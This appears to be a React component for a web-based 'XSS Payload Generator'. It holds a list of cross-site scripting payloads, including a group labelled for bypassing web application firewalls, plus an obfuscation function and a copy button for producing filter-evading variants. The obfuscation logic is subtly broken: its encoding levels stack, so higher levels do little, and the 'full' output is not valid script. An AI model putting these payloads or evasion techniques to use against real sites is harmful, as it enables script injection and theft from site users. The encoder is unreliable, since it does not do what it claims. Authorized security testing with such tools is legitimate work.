'use client';

import { useState, useCallback } from 'react';
import { Copy, Check, RefreshCw, Code2, Sparkles } from 'lucide-react';
import { useTypingAnimation } from '@/lib/animations';

// XSS Payload templates
const xssPayloads = [
  // Basic
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<script>alert(1)</script>',
  '<iframe src=javascript:alert(1)>',
  
  // Event handlers
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  
  // Encoded
  '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
  '<svg/onload=alert(1)>',
  '<svg><script>alert&#40;1&#41;</script></svg>',
  
  // Advanced
  '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
  '<svg/onload=setTimeout`alert\\x281\\x29`>',
  '<details open ontoggle=alert(1)>',
  
  // WAF bypass
  '<ScRiPt>alert(1)</ScRiPt>',
  '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
  '<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">',
  
  // DOM-based
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<marquee onstart=alert(1)>',
  '<body style=animation-name:fake onanimationstart=alert(1)>',
];

// Obfuscation functions
function obfuscatePayload(payload: string, level: number): string {
  let obfuscated = payload;
  
  if (level >= 1) {
    // HTML entity encoding
    obfuscated = obfuscated.replace(/[a-z]/gi, (char) => {
      return `&#${char.charCodeAt(0)};`;
    });
  }
  
  if (level >= 2) {
    // Hex encoding
    obfuscated = obfuscated.replace(/[a-z]/gi, (char) => {
      return `&#x${char.charCodeAt(0).toString(16)};`;
    });
  }
  
  if (level >= 3) {
    // Unicode escape
    obfuscated = obfuscated.replace(/[a-z]/gi, (char) => {
      return `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`;
    });
  }
  
  if (level >= 4) {
    // Multiple encodings
    obfuscated = obfuscated
      .split('')
      .map((char) => {
        if (/[a-z]/i.test(char)) {
          return `String.fromCharCode(${char.charCodeAt(0)})`;
        }
        return char;
      })
      .join('+');
  }
  
  return obfuscated;
}

export default function XSSPayloadGenerator() {
  const [payload, setPayload] = useState(xssPayloads[0]);
  const [obfuscationLevel, setObfuscationLevel] = useState(0);
  const [copied, setCopied] = useState(false);
  const { displayedText, startTyping, reset } = useTypingAnimation(payload, 30);

  const generateRandomPayload = useCallback(() => {
    const randomPayload = xssPayloads[Math.floor(Math.random() * xssPayloads.length)];
    setPayload(randomPayload);
    reset();
    startTyping();
  }, [startTyping, reset]);

  const handleCopy = async () => {
    const finalPayload = obfuscationLevel > 0 
      ? obfuscatePayload(payload, obfuscationLevel)
      : payload;
    
    await navigator.clipboard.writeText(finalPayload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const finalPayload = obfuscationLevel > 0 
    ? obfuscatePayload(payload, obfuscationLevel)
    : payload;

  return (
    <div className="glass-card rounded-xl p-6">
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center gap-3">
          <div className="p-2 rounded-lg bg-neon-green/20 text-neon-green">
            <Code2 className="w-5 h-5" />
          </div>
          <div>
            <h3 className="text-lg font-semibold text-foreground">XSS Payload Generator</h3>
            <p className="text-xs text-muted-foreground">Generate and obfuscate XSS payloads</p>
          </div>
        </div>
        <button
          onClick={generateRandomPayload}
          className="flex items-center gap-2 px-4 py-2 rounded-lg bg-neon-green/10 hover:bg-neon-green/20 text-neon-green transition-colors"
        >
          <RefreshCw className="w-4 h-4" />
          <span className="text-sm font-medium">Generate</span>
        </button>
      </div>

      {/* Payload display */}
      <div className="relative mb-6">
        <div className="relative glass rounded-lg p-4 bg-dark-secondary border border-border/50">
          <div className="flex items-start justify-between gap-4">
            <div className="flex-1 font-mono text-sm text-foreground break-all">
              <pre className="whitespace-pre-wrap">
                {obfuscationLevel === 0 ? displayedText : finalPayload}
                {obfuscationLevel === 0 && (
                  <span className="inline-block w-2 h-4 bg-neon-green ml-1 animate-pulse" />
                )}
              </pre>
            </div>
            <button
              onClick={handleCopy}
              className="flex-shrink-0 p-2 rounded-lg hover:bg-muted transition-colors"
              title="Copy to clipboard"
            >
              {copied ? (
                <Check className="w-5 h-5 text-neon-green" />
              ) : (
                <Copy className="w-5 h-5 text-muted-foreground" />
              )}
            </button>
          </div>
        </div>
      </div>

      {/* Obfuscation level slider */}
      <div className="space-y-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Sparkles className="w-4 h-4 text-cyber-blue" />
            <span className="text-sm font-medium text-foreground">Obfuscation Level</span>
          </div>
          <span className="text-sm text-muted-foreground">
            {obfuscationLevel === 0 && 'None'}
            {obfuscationLevel === 1 && 'HTML Entities'}
            {obfuscationLevel === 2 && 'Hex Encoding'}
            {obfuscationLevel === 3 && 'Unicode Escape'}
            {obfuscationLevel === 4 && 'Full Obfuscation'}
          </span>
        </div>
        
        <div className="relative">
          <input
            type="range"
            min="0"
            max="4"
            value={obfuscationLevel}
            onChange={(e) => setObfuscationLevel(Number(e.target.value))}
            className="w-full h-2 bg-dark-secondary rounded-lg appearance-none cursor-pointer slider"
            style={{
              background: `linear-gradient(to right, #00FF41 0%, #00FF41 ${(obfuscationLevel / 4) * 100}%, #1A1A1C ${(obfuscationLevel / 4) * 100}%, #1A1A1C 100%)`,
            }}
          />
          <div className="flex justify-between mt-2 text-xs text-muted-foreground">
            <span>0</span>
            <span>1</span>
            <span>2</span>
            <span>3</span>
            <span>4</span>
          </div>
        </div>
      </div>

      {/* Info */}
      <div className="mt-6 pt-6 border-t border-border/50">
        <div className="flex items-start gap-3 text-xs text-muted-foreground">
          <div className="w-1 h-1 rounded-full bg-neon-green mt-1.5 flex-shrink-0" />
          <div>
            <p className="mb-1">
              <span className="font-medium text-foreground">Warning:</span> These payloads are for authorized testing only.
            </p>
            <p>Higher obfuscation levels may bypass WAF filters but increase payload size.</p>
          </div>
        </div>
      </div>
    </div>
  );
}

